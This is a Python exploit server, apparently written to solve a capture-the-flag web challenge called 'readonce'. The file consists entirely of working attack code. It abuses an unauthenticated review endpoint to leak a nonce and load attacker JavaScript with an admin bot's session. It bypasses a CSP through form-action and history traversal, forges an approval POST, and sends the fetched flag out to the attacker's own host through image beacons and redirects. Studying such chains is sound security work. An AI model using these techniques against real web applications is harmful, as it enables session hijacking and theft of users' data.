#!/usr/bin/env python3
"""readonce exploit attacker origin.

Chain:
  /go   the bot's single browser-initiated navigation. Server-side we call the
        UNAUTHENTICATED /review?rid=..&u=..  which both arms currentReview.document
        with our script URL and leaks currentReview.nonce.
        The page then window.open()s APP/sandbox?rid=..  TOP-LEVEL: not inside an
        iframe, so no sandbox attribute, so our script runs on the APP origin with
        the bot's admin session.
  /pm.js runs there. CSP is default-src 'none' (no fetch, no frames, no script
        injection) but CSP3 form-action has no default-src fallback, so a same-site
        form POST to /complete flips approved = true.
  then  the opener traverses history back to the bot's own nav#1 entry
        /reports/check?rid&state. A history traversal is browser-initiated, so it
        carries Sec-Fetch-Site: none + Sec-Fetch-Dest: document, visited is already
        true, and review-document renders note.html with no CSP at all.
  /p.js runs in review-document, reads /api/flag same-origin and exfils.
"""
import http.server, socketserver, urllib.parse, urllib.request, re, sys, json, time

APP = sys.argv[1].rstrip('/')
PUB = sys.argv[2].rstrip('/')
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8000
PADS = int(sys.argv[4]) if len(sys.argv) > 4 else 10
# The bot's cookies live on whatever APP_URL the container used; the Dockerfile
# hardcodes http://localhost:3000. Our own server-side calls still use APP.
BOT_ORIGINS = (sys.argv[5].split(',') if len(sys.argv) > 5
               else ['http://localhost:3000', 'http://127.0.0.1:3000', APP])
T0 = [None]
ST = {'rid': None, 'nonce': None, 'pmjs': 0, 'flag': None}


def arm_and_leak_nonce(rid):
    u = f"{APP}/review?rid={urllib.parse.quote(rid)}&u={urllib.parse.quote(PUB + '/pm.js', safe='')}"
    body = urllib.request.urlopen(u, timeout=10).read().decode('utf-8', 'replace')
    m = re.search(r'const report = (\{.*?\});', body)
    if not m:
        raise RuntimeError('no report object in /review body')
    return json.loads(m.group(1))['state']


PAGE = """<!doctype html><meta charset=utf-8><title>r</title><body><script>
var APP=%(app)s, RID=%(rid)s, PUB=%(pub)s;
function log(k,v){ new Image().src=PUB+'/r?k='+k+'&v='+encodeURIComponent(v)+'&t='+Date.now(); }
log('histlen', history.length);
// approval runs in a popup: top-level /sandbox on the APP origin is NOT iframe-sandboxed,
// so our nonce'd script runs on the app origin with the bot's admin session.
var ORIGINS=%(origins)s;
for (var oi=0; oi<ORIGINS.length; oi++) window.open(ORIGINS[oi]+"/sandbox?rid="+encodeURIComponent(RID));
// pad chain starts immediately, in parallel with the popup
var pre=[]; for (var i=1;i<=%(pads)d;i++) pre.push(fetch(PUB+'/pad?i='+i,{cache:'force-cache'}));
function jump(){ Promise.all(pre).catch(function(){}).then(function(){ location.href = PUB + '/pad?i=1'; }); }
if (document.readyState === 'complete') jump(); else addEventListener('load', jump);
</script></body>"""

PAD = """<!doctype html><meta charset=utf-8><body>p%(i)d<script>
var PUB=%(pub)s, I=%(i)d, N=%(n)d;
function nav(){
  if (I < N) { location.href = PUB + '/pad?i=' + (I+1); return; }
  // last pad: wait until pm.js was served (approval), then traverse back to the
  // bot's own nav#1 entry -> browser-initiated -> Sec-Fetch-Site: none
  var n=0;
  var t=setInterval(function(){
    n++;
    fetch(PUB+'/status').then(function(r){return r.json();}).then(function(j){
      if(j.pmjs || n>60){
        clearInterval(t);
        new Image().src = PUB + '/r?k=traverse&v=' + history.length + '&t=' + Date.now();
        setTimeout(function(){ history.go(-(history.length - 2)); }, 120);
      }
    }).catch(function(){});
  }, 100);
}
addEventListener('load', function(){ setTimeout(nav, 0); });
</script></body>"""

PM = """(function(){
  var f=document.createElement('form');
  f.method='POST'; f.action='/complete';
  function add(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;f.appendChild(i);}
  add('id', %(rid)s); add('state', %(nonce)s);
  document.body.appendChild(f);
  f.submit();
})();"""

P = """fetch('/api/flag').then(r=>r.text()).then(t=>{
  new Image().src=%(pub)s+'/x?f='+encodeURIComponent(t);
  setTimeout(function(){ location=%(pub)s+'/x?f='+encodeURIComponent(t); },200);
}).catch(e=>{ new Image().src=%(pub)s+'/x?err='+encodeURIComponent(String(e)); });"""


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def log_message(self, *a): pass
    def el(self):
        return '----' if T0[0] is None else ('%6.2fs' % (time.time() - T0[0]))

    def _s(self, body, ct):
        b = body.encode()
        self.send_response(200)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', str(len(b)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers(); self.wfile.write(b)

    def _sc(self, body, ct):
        b = body.encode(); self.send_response(200)
        self.send_header('Content-Type', ct); self.send_header('Content-Length', str(len(b)))
        self.send_header('Cache-Control', 'public, max-age=600')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers(); self.wfile.write(b)

    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == '/go':
            ST['rid'] = (q.get('rid') or [''])[0]; ST['pmjs'] = 0; T0[0] = time.time()
            try:
                ST['nonce'] = arm_and_leak_nonce(ST['rid'])
                print(f"[{self.el()}] [+] rid={ST['rid']}  nonce={ST['nonce']}", flush=True)
            except Exception as e:
                print('[-] /review failed:', e, flush=True)
            self._s(PAGE % {'app': json.dumps(APP), 'rid': json.dumps(ST['rid']), 'pub': json.dumps(PUB),
                            'pads': PADS, 'origins': json.dumps(BOT_ORIGINS)},
                    'text/html; charset=utf-8'); return
        if u.path == '/pm.js':
            ST['pmjs'] = 1
            print(f'[{self.el()}] [+] pm.js served -> approval form POST', flush=True)
            self._s(PM % {'rid': json.dumps(ST['rid'] or ''), 'nonce': json.dumps(ST['nonce'] or '')},
                    'application/javascript'); return
        if u.path == '/p.js':
            print(f'[{self.el()}] [+] p.js served -> XSS live in review-document', flush=True)
            self._s(P % {'pub': json.dumps(PUB)}, 'application/javascript'); return
        if u.path == '/pad':
            i = int((q.get('i') or ['1'])[0])
            print(f'[{self.el()}]     pad {i}', flush=True)
            self._sc(PAD % {'pub': json.dumps(PUB), 'i': i, 'n': PADS}, 'text/html; charset=utf-8'); return
        if u.path == '/status':
            self._s(json.dumps({'pmjs': ST['pmjs']}), 'application/json'); return
        if u.path == '/x':
            f = (q.get('f') or [''])[0]
            if f and not ST['flag']:
                ST['flag'] = f
                print('\n[FLAG] ' + f + '\n', flush=True)
            if q.get('err'): print('[-] xss error:', q['err'][0], flush=True)
            self._s('ok', 'text/plain'); return
        if u.path == '/r':
            print(f"[{self.el()}]     [beacon] {(q.get('k') or [''])[0]} = {(q.get('v') or [''])[0]}", flush=True)
            self._s('ok', 'text/plain'); return
        self._s('ok', 'text/plain')


socketserver.ThreadingTCPServer.allow_reuse_address = True
with socketserver.ThreadingTCPServer(('0.0.0.0', PORT), H) as s:
    print(f"[*] attacker on :{PORT} APP={APP} PUB={PUB}", flush=True)
    s.serve_forever()
